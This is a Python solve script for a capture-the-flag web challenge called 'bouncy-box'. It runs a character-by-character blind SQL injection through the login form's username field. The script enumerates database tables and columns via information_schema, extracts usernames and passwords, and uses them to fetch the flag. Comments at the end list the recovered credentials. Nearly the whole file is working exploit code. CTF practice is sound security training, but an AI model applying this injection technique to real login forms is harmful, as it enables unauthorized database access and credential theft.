import requests, string
s = requests.session()

url = 'https://bouncy-box.chals.damctf.xyz/login'

arr = ',' + string.printable

def blind_table(step):
    for char in arr:
        res = s.post(url,json={"username":f"admin' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema like database()),{step},1))={ord(char)}-- -",
        "password":"admin","score":0}).status_code
        if res==200:
            return char
    return None
 
def tables():
    table = 'users'
    step = len(table) +1
    while True:
        char = blind_table(step)
        if char == None:
            return 'table = '+table
        table += char
        step += 1
        print('[+] table = ',table)    

def blind_column(step):
    for char in arr:
        res = s.post(url,json={"username":f"admin' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema like database()),{step},1))={ord(char)}-- -",
        "password":"admin","score":0}).status_code
        if res==200:
            return char
    return None
 
def columns():
    column = 'games_played,high_score,id,joined,password,username'
    step = len(column) +1
    while True:
        char = blind_column(step)
        if char == None:
            return 'column ='+column
        column += char
        step += 1
        print('[+] column = ',column)    


def blind_row(column,step):
    for char in arr:
        res = s.post(url,json={"username":f"admin' or ascii(substr((select {column} from users limit 1),{step},1))={ord(char)}-- -",
        "password":"admin","score":0}).status_code
        if res==200:
            return char
    return None
 
def rows(column):
    row = ''
    step = len(row) +1
    while True:
        char = blind_row(column,step)
        if char == None:
            return row
        row += char
        step += 1
        print('[+] %s = '%column,row)  

username = rows('username')
password = rows('password')

flag = s.post('https://bouncy-box.chals.damctf.xyz/flag',data={'username_input':username,'password_input':password}).text
print(flag)

#username =  boxy_mcbounce,BobbySinclusto,azurediamond,sergeantGeech,testbaboon,toxic_Y,Aqcurate,BaboonWithTheGoon,hm3k,Lance 
# password = B0UncYBouNc3,P@$$w0rD12!